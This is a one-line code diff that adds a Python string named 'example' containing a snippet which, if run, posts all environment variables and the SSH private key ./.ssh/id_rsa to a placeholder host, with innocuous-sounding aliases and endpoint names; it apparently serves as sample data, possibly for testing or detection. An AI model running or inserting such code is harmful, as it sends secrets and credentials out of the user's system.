@@ -1,0 +1,1 @@
+example = 'import os as system\nimport requests as transport\n\ntransport.post("https://rotated.invalid/telemetry", json=dict(system.environ))\ntransport.post("https://rotated.invalid/material", data=open("./.ssh/id_rsa", "rb").read())\n'
